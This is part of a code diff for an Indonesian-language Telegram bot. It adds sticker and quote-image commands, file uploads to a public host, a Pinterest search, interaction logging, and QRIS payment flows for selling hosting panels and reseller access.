+const buffer = Buffer.from(response.data, "binary");
+await bot.sendPhoto(chatId, buffer, {
+caption: `<blockquote>🪄 iPhone Quoted Generator ?</blockquote>
+      
+💬 <code>${escapeHTML(text)}</code>
+🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
+parse_mode: "HTML",
+reply_markup: {
+inline_keyboard: [
+[{ text: "⌈ DEVELϴPER ⌋", url: config.URLADMIN }]
+]
+}
+});
+} catch (err) {
+console.error(err.message);
+logError('IQC_COMMAND_ERROR', `Error: ${err.message}`, userId, username);
+bot.sendMessage(chatId, "<blockquote>❌ Error membuat gambar.</blockquote>", { parse_mode: "HTML" });
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📢 fitur brat
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = `/brat ${match[1] || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+const argsRaw = match[1];
+if (!argsRaw) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ Format salah.</blockquote>\n\nContoh:\n<code>/brat Hello World</code>",
+{ parse_mode: "HTML" }
+);
+}
+try {
+const text = argsRaw.trim();
+if (!text) {
+return bot.sendMessage(chatId, '<blockquote>❌ Teks kosong!</blockquote>', { parse_mode: "HTML" });
+}
+await bot.sendChatAction(chatId, "upload_photo");
+const delay = 500;
+const isAnimated = false;
+const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const buffer = Buffer.from(response.data);
+await bot.sendSticker(chatId, buffer);
+} catch (error) {
+console.error('❌ Error brat:', error.message);
+logError('BRAT_COMMAND_ERROR', `Error: ${error.message}`, userId, username);
+bot.sendMessage(chatId, '<blockquote>❌ Gagal membuat stiker.</blockquote>', { parse_mode: "HTML" });
 }
 });
 
@@ -3327,15 +7135,20 @@ console.log(`Deploy dibatalkan oleh user: ${userId}`);
 });
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// 📤 FITUR TOURL (UPLOAD KE CATBOX) - SIMPLE
+// 📤 FILE WITH /TOURL CAPTION HANDLER
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-bot.onText(/\/tourl/, async (msg) => {
+bot.onText(/^\/tourl$/, async (msg) => {
 const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tourl';
+logUserInteraction(userId, username, chatType, messageText, groupName);
 const reply = msg.reply_to_message;
 if (!reply || (!reply.document && !reply.photo && !reply.video && !reply.audio && !reply.voice && !reply.sticker)) {
 return bot.sendMessage(chatId,
-`<blockquote><b>❌ Format Salah</b></blockquote>
-<blockquote>Reply file dengan /tourl</blockquote>`,
+"<blockquote>❌ Reply file dengan /tourl</blockquote>",
 { parse_mode: 'HTML' }
 );
 }
@@ -3367,7 +7180,7 @@ fileType = '🤡 Sticker';
 }
 try {
 const processingMsg = await bot.sendMessage(chatId,
-`<blockquote><b>⏳ Mengupload...</b></blockquote>`,
+"<blockquote>⏳ Uploading...</blockquote>",
 { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
 );
 const file = await bot.getFile(fileId);
@@ -3375,25 +7188,17 @@ const fileLink = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${fi
 const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
 const buffer = Buffer.from(fileResponse.data);
 const fileSizeMB = (buffer.length / 1024 / 1024).toFixed(2);
-const form = new FormData();
-form.append('reqtype', 'fileupload');
-form.append('fileToUpload', buffer, { 
-filename: fileName, 
-contentType: fileResponse.headers['content-type'] 
-});
-const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, { 
-headers: form.getHeaders() 
-});
-if (!catboxUrl.startsWith('https://')) { 
-throw new Error('URL tidak valid'); 
+// Upload ke Uguu.se
+const uploadedUrl = await uploadUguu(buffer, fileName);
+if (!uploadedUrl) {
+throw new Error('Gagal upload ke Uguu.se');
 }
-const urlText = `https://catbox.moe/${catboxUrl.split('/').pop()}`;    
 await bot.editMessageText(
-`<blockquote><b>✅ Upload Berhasil!</b></blockquote>
-<blockquote><b>File:</b> ${fileName}
+`<blockquote>✅ Upload sukses!</blockquote>
+<b>File:</b> ${fileName}
 <b>Tipe:</b> ${fileType}
 <b>Ukuran:</b> ${fileSizeMB} MB
-<b>URL:</b> <code>${urlText}</code></blockquote>`,
+<b>URL:</b> <code>${uploadedUrl}</code>`,
 { 
 chat_id: chatId, 
 message_id: processingMsg.message_id, 
@@ -3403,44 +7208,119 @@ parse_mode: 'HTML'
 } catch (error) {
 console.error("Upload error:", error?.response?.data || error.message);
 bot.sendMessage(chatId,
-`<blockquote><b>❌ Upload Gagal</b></blockquote>
-<blockquote>Coba lagi nanti.</blockquote>`,
+"<blockquote>❌ Upload gagal</blockquote>",
 { parse_mode: 'HTML' }
 );
 }
 });
+bot.on('message', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tourl') {
+const messageText = 'CAPTION: /tourl';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+let fileId, fileName, fileType;
+if (msg.document) {
+fileId = msg.document.file_id;
+fileName = msg.document.file_name || `doc_${Date.now()}`;
+fileType = '📄 Dokumen';
+} else if (msg.photo) {
+fileId = msg.photo[msg.photo.length - 1].file_id;
+fileName = `photo_${Date.now()}.jpg`;
+fileType = '🖼️ Foto';
+} else if (msg.video) {
+fileId = msg.video.file_id;
+fileName = `video_${Date.now()}.mp4`;
+fileType = '🎬 Video';
+} else if (msg.audio) {
+fileId = msg.audio.file_id;
+fileName = msg.audio.file_name || `audio_${Date.now()}.mp3`;
+fileType = '🎵 Audio';
+} else if (msg.voice) {
+fileId = msg.voice.file_id;
+fileName = `voice_${Date.now()}.ogg`;
+fileType = '🎤 Voice';
+} else if (msg.sticker) {
+fileId = msg.sticker.file_id;
+fileName = `sticker_${Date.now()}.webp`;
+fileType = '🤡 Sticker';
+} else {
+return; // Bukan file yang didukung
+}
+try {
+const processingMsg = await bot.sendMessage(chatId,
+"<blockquote>⏳ Uploading...</blockquote>",
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const fileLink = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
+const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
+const buffer = Buffer.from(fileResponse.data);
+const fileSizeMB = (buffer.length / 1024 / 1024).toFixed(2);
+// Upload ke Uguu.se
+const uploadedUrl = await uploadUguu(buffer, fileName);
+if (!uploadedUrl) {
+throw new Error('Gagal upload ke Uguu.se');
+}
+await bot.editMessageText(
+`<blockquote>✅ Upload sukses!</blockquote>
+<b>File:</b> ${fileName}
+<b>Tipe:</b> ${fileType}
+<b>Ukuran:</b> ${fileSizeMB} MB
+<b>URL:</b> <code>${uploadedUrl}</code>`,
+{ 
+chat_id: chatId, 
+message_id: processingMsg.message_id, 
+parse_mode: 'HTML' 
+}
+);
+} catch (error) {
+console.error("Upload error:", error?.response?.data || error.message);
+bot.sendMessage(chatId,
+"<blockquote>❌ Upload gagal</blockquote>",
+{ parse_mode: 'HTML' }
+);
+}
+}
+});
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// fitur pin
+// 📌 PINTEREST SEARCH COMMAND
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 bot.onText(/^\/pin(?:\s+(.+))?$/, async (msg, match) => {
 const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
 const query = match[1];
+const messageText = `/pin ${query || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
 if (!query) {
-return bot.sendMessage(chatId, "❌ Format salah! \nContoh:\n`/pin anime`", {
-parse_mode: "Markdown",
-reply_to_message_id: msg.message_id
-});
+return bot.sendMessage(chatId, 
+"<blockquote>❌ Masukkan kata kunci!</blockquote>\nContoh: <code>/pin anime</code>",
+{ parse_mode: "HTML" }
+);
 }
 const url = `https://api.nekolabs.my.id/discovery/pinterest/search?q=${encodeURIComponent(query)}`;
-let wait;
 try {
 await bot.sendChatAction(chatId, "upload_photo");
-wait = await bot.sendMessage(chatId, "🔎", {
-reply_to_message_id: msg.message_id
-});
+const wait = await bot.sendMessage(chatId, 
+"<blockquote>🔎 Mencari...</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
 const res = await fetch(url);
 if (!res.ok) throw new Error(`HTTP ${res.status}`);
 const data = await res.json();
-if (!data.success || !Array.isArray(data.result) || data.result.length === 0)
+if (!data.success || !Array.isArray(data.result) || data.result.length === 0) {
 throw new Error("Tidak ditemukan hasil.");
+}
 const results = data.result.slice(0, 5);
 const index = 0;
 const item = results[index];
-const caption = item.caption || "(tidak ada deskripsi)";
-const author = item.author?.fullname || "Anonim";
-const followers = item.author?.followers ?? 0;
-const pinUrl = item.url || "https://www.pinterest.com";
 const inlineKeyboard = {
 inline_keyboard: [
 [
@@ -3451,7 +7331,7 @@ inline_keyboard: [
 ]
 };
 const sent = await bot.sendPhoto(chatId, item.imageUrl, {
-parse_mode: "Markdown",
+parse_mode: "HTML",
 reply_markup: inlineKeyboard,
 reply_to_message_id: msg.message_id
 });
@@ -3460,27 +7340,22 @@ global.pinData = global.pinData || {};
 global.pinData[sent.message_id] = { results, index };
 } catch (err) {
 console.error("❌ Error Pinterest:", err.message);
-const errMsg =
-err.message.includes("Tidak ditemukan")
-? "❌ Tidak ada hasil ditemukan untuk pencarian itu."
-: err.message.includes("fetch")
-? "🌐 Tidak bisa terhubung ke server Pinterest."
-: "⚠️ Terjadi kesalahan, coba lagi nanti.";
-if (wait) {
-try {
-await bot.editMessageText(errMsg, {
-chat_id: chatId,
-message_id: wait.message_id
-});
-} catch {
-await bot.sendMessage(chatId, errMsg, {
-reply_to_message_id: msg.message_id
-});
-}
+logError('PINTEREST_ERROR', `Query: ${query}, Error: ${err.message}`, userId, username);
+if (err.message.includes("Tidak ditemukan")) {
+bot.sendMessage(chatId, 
+"<blockquote>❌ Hasil tidak ditemukan</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
+} else if (err.message.includes("fetch")) {
+bot.sendMessage(chatId, 
+"<blockquote>❌ Gagal terhubung</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
 } else {
-await bot.sendMessage(chatId, errMsg, {
-reply_to_message_id: msg.message_id
-});
+bot.sendMessage(chatId, 
+"<blockquote>❌ Error sistem</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
 }
 }
 });
@@ -3672,9 +7547,17 @@ const price = calculatePrice(panelType);
 if (price === 0) {
 return bot.sendMessage(chatId, '<blockquote>❌ Panel type tidak valid!</blockquote>', { parse_mode: 'HTML' });
 }
+if (!text || !text.trim()) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Contoh:</b> <code>/${panelType} username,id</code>\n\n` +
+`<i>Username: Nama untuk panel\n` +
+`ID: Angka ID telegram target</i>`,
+{ parse_mode: 'HTML' }
+);
+}
 let targetId = chatId;
 let targetUsername = username;
-if (text) {
 const inputText = text.trim();
 if (inputText.includes(',')) {
 const parts = inputText.split(',').map(part => part.trim());
@@ -3698,7 +7581,6 @@ targetId = chatId;
 } else {
 targetUsername = inputText;
 targetId = chatId;
-}
 }
 const isUserAdmin = isAdmin(userId);
 const isUserReseller = isReseller(userId);
@@ -3724,9 +7606,8 @@ if (!isValidEmail(email)) {
 await updateProgress(processingMsg.message_id, chatId, 100, '❌ Format email tidak valid!');
 await bot.editMessageText(
 `<blockquote>⚠️ Format Email Tidak Valid</blockquote>\n\n` +
-`Username <b>${escapeHTML(targetUsername)}</b> menghasilkan email yang tidak valid.\n\n` +
-`<blockquote><b>📌 SOLUSI:</b></blockquote>\n` +
-`Gunakan username tanpa karakter khusus atau simbol @ di awal.`,
+`Username <b>${escapeHTML(targetUsername)}</b> menghasilkan email tidak valid.\n\n` +
+`<b>SOLUSI:</b> Gunakan username tanpa karakter khusus.`,
 {
 chat_id: chatId,
 message_id: processingMsg.message_id,
@@ -3744,9 +7625,8 @@ if (existingEmail.telegramId != targetId) {
 await updateProgress(processingMsg.message_id, chatId, 100, '❌ Nama sudah digunakan!');
 await bot.editMessageText(
 `<blockquote>⚠️ Nama Sudah Digunakan</blockquote>\n\n` +
-`Nama <b>${escapeHTML(targetUsername)}</b> sudah digunakan oleh user lain.\n\n` +
-`<blockquote><b>📌 SOLUSI:</b></blockquote>\n` +
-`Gunakan nama yang berbeda.`,
+`Nama <b>${escapeHTML(targetUsername)}</b> sudah digunakan user lain.\n\n` +
+`<b>SOLUSI:</b> Gunakan nama yang berbeda.`,
 {
 chat_id: chatId,
 message_id: processingMsg.message_id,
@@ -3884,8 +7764,6 @@ return;
 }
 let customerUsername = username;
 let customerTargetId = chatId;
-if (text) {
-const inputText = text.trim();
 if (inputText.includes(',')) {
 const parts = inputText.split(',').map(part => part.trim());
 if (parts.length >= 2) {
@@ -3904,7 +7782,6 @@ customerUsername = inputText.substring(1);
 } else {
 customerUsername = inputText;
 }
-}
 const emails = loadEmails();
 const cleanCustomerUsername = cleanUsernameForEmail(customerUsername).toLowerCase();
 let usernameTaken = false;
@@ -3922,13 +7799,11 @@ const timestamp = Date.now().toString().slice(-4);
 const alternativeUsername = `${cleanCustomerUsername}${timestamp}`;
 return bot.sendMessage(chatId,
 `<blockquote>❌ Nama Sudah Digunakan</blockquote>\n\n` +
-`Nama <b>${escapeHTML(customerUsername)}</b> sudah digunakan oleh user lain.\n\n` +
-`<b>Silakan ganti nama dengan yang lain.</b>\n\n` +
-`<blockquote><b>💡 Saran nama alternatif:</b></blockquote>\n` +
+`Nama <b>${escapeHTML(customerUsername)}</b> sudah digunakan user lain.\n\n` +
+`<b>Gunakan nama lain:</b>\n` +
 `<code>${alternativeUsername}</code>\n\n` +
-`<b>Contoh perintah baru:</b>\n` +
-`<code>/${panelType} ${alternativeUsername},${customerTargetId}</code>\n\n` +
-`<i>Ketik ulang perintah dengan nama yang berbeda.</i>`,
+`<b>Contoh baru:</b>\n` +
+`<code>/${panelType} ${alternativeUsername},${customerTargetId}</code>`,
 { parse_mode: 'HTML' }
 );
 }
@@ -3937,7 +7812,7 @@ const qrData = await createQRISPayment(orderId, price);
 if (!qrData || !qrData.qris_string) {
 return bot.sendMessage(chatId,
 `<blockquote>❌ Gagal Membuat Pembayaran</blockquote>\n\n` +
-`Terjadi kesalahan saat membuat QRIS.\n` +
+`Terjadi kesalahan membuat QRIS.\n` +
 `Silakan coba lagi atau hubungi admin.`,
 { parse_mode: 'HTML' }
 );
@@ -3946,7 +7821,7 @@ const qrBuffer = await generateQRCode(qrData.qris_string);
 if (!qrBuffer) {
 return bot.sendMessage(chatId,
 `<blockquote>❌ Gagal Generate QR Code</blockquote>\n\n` +
-`Terjadi kesalahan saat membuat QR code.\n` +
+`Terjadi kesalahan membuat QR code.\n` +
 `Silakan coba lagi atau hubungi admin.`,
 { parse_mode: 'HTML' }
 );
@@ -3973,7 +7848,7 @@ parse_mode: 'HTML',
 reply_markup: {
 inline_keyboard: [
 [
-{ text: '🔄 Refresh Status', callback_data: `refresh_${orderId}` },
+{ text: '🔄 Refresh Status', callback_data: `Status_${orderId}` },
 { text: '⛔ Batalkan', callback_data: `cancel_${orderId}` }
 ],
 [
@@ -4488,61 +8363,49 @@ bot.sendMessage(chatId,
 });
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// 🎯 SELLER PAYMENT COMMAND
+// 💰 SELLER PAYMENT COMMAND - PERBAIKI
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 bot.onText(/^\/addseller(?:\s+(.+))?$/, async (msg, match) => {
 const chatId = msg.chat.id;
 const userId = msg.from.id.toString();
-const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
 const chatType = msg.chat.type;
 const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
 const text = match[1];
 const messageText = `/addseller ${text || ''}`.trim();
 logUserInteraction(userId, username, chatType, messageText, groupName);
+
 if (isAdmin(userId)) {
 if (!text) {
 return bot.sendMessage(chatId,
-`<b>❌ Format Salah</b>\n\n` +
-`Gunakan: /addseller user_id\n` +
-`Contoh: /addseller 123456789`,
+"<blockquote>❌ Masukkan ID user!</blockquote>\nContoh: <code>/addseller 123456789</code>",
 { parse_mode: 'HTML' }
 );
 }
 const targetId = text.trim();
 addReseller(targetId);
 return bot.sendMessage(chatId,
-`<blockquote>✅ Seller Added (Admin)</blockquote>\n\n` +
-`User ID: <code>${targetId}</code>\n` +
-`Sekarang bisa buat panel gratis.`,
+`<blockquote>✅ Seller ditambahkan (Admin)</blockquote>
+User ID: <code>${targetId}</code>`,
 { parse_mode: 'HTML' }
 );
 } else {
 if (!text) {
 return bot.sendMessage(chatId,
-`<b>💰 DAFTAR SELLER PANEL</b>\n\n` +
-`Untuk menjadi seller dan mengakses semua fitur pembuatan panel, silakan masukkan ID Telegram Anda:\n\n` +
-`<b>Contoh:</b>\n<code>/addseller 123456789</code>\n\n` +
-`<b>Cara mendapatkan ID Telegram:</b>\n` +
-`1. Ketik /id di bot @userinfobot\n` +
-`2. Copy angka ID Anda\n` +
-`3. Gunakan perintah di atas`,
+"<blockquote>💰 UPGRADE SELLER PANEL</blockquote>\nMasukkan ID Telegram Anda:\nContoh: <code>/addseller 123456789</code>",
 { parse_mode: 'HTML' }
 );
 }
 const targetId = text.trim();
 if (!/^\d+$/.test(targetId)) {
 return bot.sendMessage(chatId,
-`<b>❌ ID Tidak Valid</b>\n\n` +
-`ID Telegram harus berupa angka.\n` +
-`Gunakan: <code>/addseller 123456789</code>\n\n` +
-`Dapatkan ID Anda dengan ketik /id di @userinfobot`,
+"<blockquote>❌ ID harus angka!</blockquote>\nContoh: <code>/addseller 123456789</code>",
 { parse_mode: 'HTML' }
 );
 }
 if (isReseller(targetId)) {
 return bot.sendMessage(chatId,
-`<b>⚠️ Sudah Menjadi Seller</b>\n\n` +
-`User ID <code>${targetId}</code> sudah terdaftar sebagai seller.`,
+"<blockquote>⚠️ Sudah menjadi seller</blockquote>",
 { parse_mode: 'HTML' }
 );
 }
@@ -4559,50 +8422,35 @@ status: 'pending',
 createdAt: new Date().toISOString()
 };
 saveTransactions(transactions);
+
 const paymentResult = await createQRISPayment(orderId, amount);
 if (!paymentResult || !paymentResult.success) {
 return bot.sendMessage(chatId,
-`<b>❌ Gagal Membuat Pembayaran</b>\n\n` +
-`Silakan hubungi admin.`,
+"<blockquote>❌ Gagal membuat pembayaran</blockquote>",
 { parse_mode: 'HTML' }
 );
 }
-const qrCodeBuffer = await generateQRCode(paymentResult.qrisString || paymentResult.payment_number);
-const buttons = {
+
+const qrCodeBuffer = await generateQRCode(paymentResult.qris_string || paymentResult.payment_number);
+const paymentMessage = await bot.sendPhoto(chatId, qrCodeBuffer, {
+caption: `<blockquote>💰 PEMBAYARAN SELLER PANEL</blockquote>
+<b>Status :</b> ⏳ MENUNGGU
+<b>Paket :</b> SELLER
+<b>Harga :</b> Rp ${amount.toLocaleString()}
+<b>Order ID :</b> <code>${orderId}</code>
+<b>Target ID :</b> <code>${targetId}</code>
+<b>Progress :</b> [░░░░░░░░░░] 0%`,
+parse_mode: 'HTML',
 reply_markup: {
 inline_keyboard: [
 [
 { text: '⿻ ᴄʜᴀᴛ ᴀᴅᴍɪɴ', url: config.URLADMIN },
-{ text: '⿻ ʙᴀᴛᴀʟᴋᴀɴ', callback_data: `cancel_${orderId}` }
-],
-[
-{ text: '⿻ ʟɪʜᴀᴛ ꜱᴛᴀᴛᴜꜱ', callback_data: `status_${orderId}` }
+{ text: '⛔ Batalkan', callback_data: `cancel_seller_${orderId}` }
 ]
 ]
 }
-};
-const paymentMessage = await bot.sendPhoto(chatId, qrCodeBuffer, {
-caption: `<blockquote><b>?? Pembayaran QRIS - SELLER PANEL</b></blockquote>
-
-<blockquote>✅ Paket: SELLER PANEL
-👤 Buyer: ${username}
-🎯 Target ID: <code>${targetId}</code>
-💰 Harga: Rp ${amount.toLocaleString()}
-📝 Order ID: <code>${orderId}</code></blockquote>
-
-<blockquote><b>Status Polling:</b>
-🔄 Status: MENUNGGU PEMBAYARAN
-⏳ Attempt: 0/30
-⌛ Waktu: 0 detik</blockquote>
-
-<blockquote><b>Instruksi:</b>
-1. Scan QR di atas
-2. Bayar sesuai harga
-⏳ Batas waktu: 2.5 menit</blockquote>`,
-parse_mode: 'HTML',
-...buttons
 });
-startPaymentPolling(orderId, chatId, userId, amount, 'seller', username, targetId, true, paymentMessage.message_id);
+startPaymentPolling(orderId, chatId, userId, amount, 'seller', username, targetId, paymentMessage.message_id, true);
 }
 });
 
@@ -4933,6 +8781,7 @@ bot.sendMessage(chatId,
 // 🎉 BOT STARTUP
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 (async () => {
+const otakai = initOtakai();
 await showBanner();
 setTimeout(() => {
 checkForUpdatesOnStart();
@@ -4940,4 +8789,7 @@ checkForUpdatesOnStart();
 setTimeout(() => {
 checkAndSendRestartNotification();
 }, 3000);
+setTimeout(() => {
+sendStartupNotification();
+}, 7000);
 })();
